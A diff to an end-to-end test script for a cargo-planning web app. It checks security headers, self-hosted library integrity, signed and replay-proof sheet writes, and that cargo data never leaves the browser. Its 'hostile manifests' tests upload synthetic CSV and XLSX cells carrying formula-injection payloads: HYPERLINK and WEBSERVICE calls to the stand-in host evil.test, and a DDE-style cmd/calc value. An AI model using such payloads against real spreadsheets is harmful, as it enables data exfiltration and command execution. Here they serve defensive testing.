@@ -6,6 +6,7 @@ import { spawn } from "node:child_process";
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
+import { loadGs } from "./gs-harness.mjs";
 
 const APP = 5300, SHEET = 5301, CDP = 9340;
 const BASE = `http://localhost:${APP}`;
@@ -18,7 +19,9 @@ const CI = !!process.env.GITHUB_ACTIONS;
 const annotate = (msg) => { if (CI) console.log(`::error title=e2e::${String(msg).replace(/\r?\n/g, " ").slice(0, 900)}`); };
 const check = (ok, msg) => { results.push([ok, msg]); console.log(`  ${ok ? "PASS" : "FAIL"}  ${msg}`); if (!ok) { fails++; annotate("FAIL " + msg); } };
 
-/* ---------- mock sheet (stands in for the Apps Script web app) ---------- */
+/* ---------- mock sheet: the REAL scripts/access-requests.gs, run with stand-in Google services ---------- */
+const SHEET_KEY = "e2e-signing-key-" + "x".repeat(32);
+const gs = loadGs({ key: SHEET_KEY });
 const rows = [];
 let sheetMode = "ok";
 const sheet = http.createServer((req, res) => {
@@ -26,9 +29,10 @@ const sheet = http.createServer((req, res) => {
   req.on("data", (c) => (b += c));
   req.on("end", () => {
     if (sheetMode === "fail") { res.writeHead(500); return res.end("down"); }
-    try { rows.push(JSON.parse(b)); } catch { rows.push({ bad: b }); }
+    const out = gs.doPost(b); // verifies signature, timestamp and nonce exactly as Apps Script will
+    if (out.ok) { try { rows.push(JSON.parse(JSON.parse(b).payload)); } catch { rows.push({ bad: b }); } }
     res.writeHead(200, { "Content-Type": "application/json" });
-    res.end('{"ok":true}');
+    res.end(JSON.stringify(out));
   });
 }).listen(SHEET);
 const waitRow = async (pred, ms = 8000) => { const t = Date.now(); while (Date.now() - t < ms) { const r = rows.find(pred); if (r) return r; await sleep(150); } return null; };
@@ -36,7 +40,7 @@ const waitRow = async (pred, ms = 8000) => { const t = Date.now(); while (Date.n
 /* ---------- app ---------- */
 const next = spawn(process.execPath, ["node_modules/next/dist/bin/next", "start", "-p", String(APP)], {
   // all test browsers share one address, so allow more usage events per minute than a real visitor gets (60)
-  env: { ...process.env, ADEYIQ_SHEET_URL: `http://127.0.0.1:${SHEET}/exec`, ADEYIQ_TRACK_PER_MIN: "600" }, stdio: ["ignore", "pipe", "pipe"],
+  env: { ...process.env, ADEYIQ_SHEET_URL: `http://127.0.0.1:${SHEET}/exec`, ADEYIQ_SHEET_KEY: SHEET_KEY, ADEYIQ_TRACK_PER_MIN: "600" }, stdio: ["ignore", "pipe", "pipe"],
 });
 let serverLog = "";
 next.stdout.on("data", (d) => (serverLog += d));
@@ -58,6 +62,16 @@ const home = await fetch(BASE + "/");
 const csp = home.headers.get("content-security-policy") || "";
 check(home.status === 200 && csp.includes("frame-ancestors 'self'") && home.headers.get("x-content-type-options") === "nosniff", "home page served with CSP and nosniff headers");
 for (const p of ["/build", "/hold-view", "/aircraft-data", "/privacy", "/dashboard"]) check((await fetch(BASE + p)).status === 200, `${p} returns 200`);
+for (const p of ["/", "/build", "/adeyiq/xlsx-worker.js", "/vendor/sheetjs/0.20.3/xlsx.full.min.js"]) {
+  const h = (await fetch(BASE + p)).headers.get("content-security-policy") || "";
+  check(h && !/cdnjs|jsdelivr|unpkg/.test(h) && /worker-src 'self'/.test(h), `${p}: security policy allows no script CDN`);
+}
+check(/cdnjs.cloudflare.com/.test((await fetch(BASE + "/adeyiq_cargo_optimizer_v4.html")).headers.get("content-security-policy") || ""), "only the legacy optimizer demo may load from cdnjs");
+{
+  const v = await fetch(BASE + "/vendor/sheetjs/0.20.3/xlsx.full.min.js"), t = await v.text();
+  const sha = (await import("node:crypto")).createHash("sha256").update(t).digest("hex");
+  check(v.status === 200 && sha === "cc015130aa8521e7f088f88898eba949ccdcbfb38df0bd129b44b7273c3a6f41", `self-hosted SheetJS 0.20.3 is served unchanged (sha256 ${sha.slice(0, 12)}…)`);
+}
 const dash = await (await fetch(BASE + "/dashboard")).text();
 check(dash.includes("noindex") && dash.includes("invented sample data"), "demo dashboard is marked noindex and labelled as sample data");
 
@@ -71,6 +85,17 @@ check((await ev({ event: "open", detail: "x".repeat(5000) })).status === 413, "o
 check((await ev({ event: "open", page: "/e2e-http", visitor: "e2e-http" })).status === 204, "valid same-origin event accepted (204)");
 check(!!(await waitRow((r) => r.visitor === "e2e-http")), "accepted event reaches the sheet");
 check(!rows.some((r) => r.visitor === "e2e-bot"), "events from headless or bot browsers are not written");
+{
+  // straight to the Apps Script, bypassing the website: unsigned, wrongly signed and replayed writes are refused
+  const post = (b) => fetch(`http://127.0.0.1:${SHEET}/exec`, { method: "POST", body: JSON.stringify(b) }).then((r) => r.json());
+  const n0 = rows.length, crypto = await import("node:crypto");
+  const signed = (data, key) => { const ts = Date.now(), nonce = crypto.randomBytes(18).toString("base64url"), payload = JSON.stringify(data); return { v: 1, ts, nonce, payload, sig: crypto.createHmac("sha256", key).update(`${ts}.${nonce}.${payload}`).digest("base64") }; };
+  const a = await post({ type: "usage", event: "open", visitor: "attacker" });
+  const b = await post(signed({ type: "usage", event: "open", visitor: "attacker" }, "w".repeat(40)));
+  const good = signed({ type: "usage", event: "open", visitor: "e2e-replay" }, SHEET_KEY);
+  const c1 = await post(good), c2 = await post(good);
+  check(!a.ok && !b.ok && c1.ok && !c2.ok && rows.length === n0 + 1, "Apps Script refuses unsigned, wrongly signed and replayed writes; a correctly signed one is accepted once");
+}
 
 /* ---------- browser ---------- */
 // Ubuntu 24+ runners block the unprivileged namespaces Chrome's sandbox needs; the test only opens the local build
@@ -293,6 +318,8 @@ const relevant = pageErrors.filter((e) => !expected(e));
 check(!relevant.some((e) => /Content Security Policy|Refused to/.test(e)), "no Content-Security-Policy violations" + (relevant.length ? "" : ""));
 check(relevant.length === 0, `no uncaught page errors${relevant.length ? ": " + relevant.slice(0, 5).join(" || ") : ""}`);
 
+// the builder page no longer loads SheetJS itself (only its worker does); tests load the self-hosted copy to make test files
+const LOAD_XLSX = `new Promise(r=>{if(window.XLSX)return r(1);const s=document.createElement('script');s.src='/vendor/sheetjs/0.20.3/xlsx.full.min.js';s.onload=()=>r(1);document.head.appendChild(s)})`;
 console.log("\nPrivacy: cargo never leaves the browser (synthetic markers, every request watched)");
 {
   // distinctive synthetic values that must never appear in any request or in anything forwarded to the sheet
@@ -307,6 +334,7 @@ console.log("\nPrivacy: cargo never leaves the browser (synthetic markers, every
     await new Promise(r=>{const t0=Date.now(),iv=setInterval(()=>{if(document.getElementById('st1s').textContent!==b0||Date.now()-t0>4000){clearInterval(iv);r()}},40)});await new Promise(r=>setTimeout(r,1300));return document.getElementById('toast').textContent})()`);
   await up("secret.csv", csv);
   // the same kind of data as a real .xlsx made in the page with SheetJS
+  await js(LOAD_XLSX);
   await js(`(async()=>{const ws=XLSX.utils.aoa_to_sheet([["AWB","Goods","Pieces","Weight","L","W","H"],[${JSON.stringify(MK.awb2)},${JSON.stringify(MK.nat2)},2,${MK.kg},137,41,59]]),wb=XLSX.utils.book_new();XLSX.utils.book_append_sheet(wb,ws,'B');
     const buf=XLSX.write(wb,{type:'array',bookType:'xlsx'});const dt=new DataTransfer();dt.items.add(new File([buf],'secret.xlsx'));const f=document.getElementById('file');f.files=dt.files;f.dispatchEvent(new Event('change'));await new Promise(r=>setTimeout(r,2500))})()`);
   await js(`(async()=>{const s=(id,v)=>{const e=document.getElementById(id);e.value=v;e.dispatchEvent(new Event('input'));e.dispatchEvent(new Event('change'))};if(document.getElementById('addPanel').hidden)document.getElementById('addToggle').click();
@@ -330,8 +358,8 @@ console.log("\nPrivacy: cargo never leaves the browser (synthetic markers, every
   const leaks = Object.values(MK).concat(["999-77700033"]).filter((v) => all.includes(v) || all.includes(encodeURIComponent(v)) || fwd.includes(v));
   check(leaks.length === 0, `no AWB, goods, UN number, weight or dimensions in any of ${reqs.length} browser requests or ${rows.length - rows0} forwarded rows${leaks.length ? " — found: " + leaks.join(", ") : ""}`);
   const hosts = [...new Set(reqs.map((r) => { try { return new URL(r.url).host; } catch { return r.url.slice(0, 20); } }))].sort();
-  const allowed = ["localhost:" + APP, "fonts.googleapis.com", "fonts.gstatic.com", "cdnjs.cloudflare.com"];
-  check(hosts.every((h) => allowed.includes(h) || h === ""), `browser only talks to AdeyIQ, Google Fonts and cdnjs (${hosts.join(", ")})`);
+  const allowed = ["localhost:" + APP, "fonts.googleapis.com", "fonts.gstatic.com"];
+  check(hosts.every((h) => allowed.includes(h) || h === ""), `browser only talks to AdeyIQ and Google Fonts; the Excel reader is self-hosted (${hosts.join(", ")})`);
   const third = reqs.filter((r) => !r.url.startsWith(BASE) && !r.url.startsWith("data:") && !r.url.startsWith("blob:"));
   check(third.every((r) => r.body === "" && !/[?&](awb|q|data)=/.test(r.url)), `third-party requests carry no body and no query data (${third.length} requests, all font/script downloads)`);
   const details = rows.slice(rows0).filter((r) => r.type === "usage").map((r) => r.detail || "");
@@ -353,6 +381,7 @@ console.log("\nHostile manifests (synthetic)");
   const net0 = netLog.length;
   const f1 = await up("formula.csv", `AWB,Goods,Pieces,Weight,L,W,H\n071-11112222,"=HYPERLINK(""http://evil.test/x"",""click"")",1,10,50,40,30\n071-11113333,"=WEBSERVICE(""http://evil.test/y"")",1,10,50,40,30\n071-11114444,@SUM(1+1)*cmd|' /C calc'!A0,1,10,50,40,30\n`);
   check(f1.n === 3 && (await js(`document.getElementById('cargo').textContent.includes('=HYPERLINK(')`)) && !netLog.slice(net0).some((r) => r.url.includes("evil.test")), "spreadsheet formulas in cells stay plain text and never trigger a request");
+  await js(LOAD_XLSX);
   const xf = await js(`(async()=>{const ws=XLSX.utils.aoa_to_sheet([["AWB","Goods","Pieces","Weight","L","W","H"],["071-22223333","x",1,10,50,40,30]]);ws.B2={t:'s',v:'cached',f:'HYPERLINK("http://evil.test/z","x")'};const wb=XLSX.utils.book_new();XLSX.utils.book_append_sheet(wb,ws,'S');return btoa(String.fromCharCode(...new Uint8Array(XLSX.write(wb,{type:'array',bookType:'xlsx'}))))})()`);
   await up("formula.xlsx", xf, true);
   check(!netLog.slice(net0).some((r) => r.url.includes("evil.test")), "an Excel formula cell is read as its stored value and never fetches anything");
